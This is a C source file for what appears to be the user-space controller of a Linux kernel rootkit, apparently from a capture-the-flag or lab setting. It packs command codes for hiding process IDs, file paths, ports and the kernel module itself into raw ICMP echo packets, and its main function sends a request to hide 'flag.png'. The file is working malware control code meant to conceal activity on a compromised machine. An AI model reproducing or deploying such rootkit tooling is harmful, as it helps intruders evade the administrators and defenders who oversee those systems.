#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>

#define CODE_HIDE_PID 0xde
#define CODE_HIDE_PATH 0xad
#define CODE_LKM_HIDE 0xbe
#define CODE_PORT_HIDE 0xef

#define PREP_REQ_HIDE_PID(tpid, buffer) do { \
    uint64_t combined_value = CODE_HIDE_PID | (tpid << 8); \
    memcpy(buffer, &combined_value, sizeof(uint64_t)); \
} while(0)
#define ADAPT_LEN_PATH_REQ(len) len+2+sizeof(len)
#define PREP_REQ_HIDE_PORT(port, buffer) do { \
    uint64_t combined_value = CODE_PORT_HIDE | (port << 8); \
    memcpy(buffer, &combined_value, sizeof(uint64_t)); \
} while(0)

char *prep_hide_path(char *path, unsigned int len){
	uint8_t *req = malloc(len+2+sizeof(len));
	memset(req, 0, len+2+sizeof(len));
	req[0] = CODE_HIDE_PATH;
	req[1] = 0;
	*(unsigned int*)(req+2) = len;
	memcpy(req+2+sizeof(len), path,len);
	return req;
}


// Define ICMP header structure
struct icmp_packet {
    struct icmphdr header;
    char message[64];  // Custom message
};

// Function to calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    // Sum up all 16-bit words
    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }

    // Add the remaining byte if any
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    // Fold 32-bit sum to 16 bits and return
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int send_kernel_code(uint8_t *req, unsigned int len) {
    int sockfd;
    struct sockaddr_in dest_addr;
    struct icmp_packet packet;
    char target_ip[] = "8.8.8.8";
    char user_message[48];
	if(len>48){
		return 1;
	}
	memcpy(user_message, req, len);

	for (size_t i = 0; i < sizeof(user_message)-len; i++)
	{
		user_message[len+i] = (i+0x10+len);
	}
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Prepare the ICMP packet
    memset(&packet, 0, sizeof(packet));
    packet.header.type = ICMP_ECHO;            // ICMP Echo Request
    packet.header.un.echo.id = getpid();       // Set unique ID for the request
    memcpy(packet.message, user_message, sizeof(user_message));  // Custom message

    // Calculate checksum for the ICMP header + payload
    packet.header.checksum = checksum(&packet, sizeof(packet));

    // Setup destination address
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = 0; // Not needed for ICMP
    dest_addr.sin_addr.s_addr = inet_addr(target_ip);

    // Send the ICMP packet
	if (sendto(sockfd, &packet, sizeof(packet)-16, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
		perror("Send failed");
		close(sockfd);
		return 1;
	}

	
    // Close the socket
    close(sockfd);
    return 0;
}
int main(){
	send_kernel_code(prep_hide_path("flag.png", 9), ADAPT_LEN_PATH_REQ(9));
	return 0;
}